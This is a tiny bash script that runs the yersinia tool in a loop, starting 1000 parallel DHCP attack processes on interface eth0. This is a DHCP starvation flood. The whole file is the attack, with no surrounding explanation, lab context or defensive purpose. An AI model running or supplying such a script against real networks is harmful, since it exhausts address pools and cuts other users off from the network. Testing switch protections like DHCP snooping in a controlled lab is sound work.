#!/usr/bin/env bash
function DHCP() {
        for i in $(seq 1 1000); do
                /usr/bin/yersinia dhcp -attack 1 -interface eth0 &
        done
}
DHCP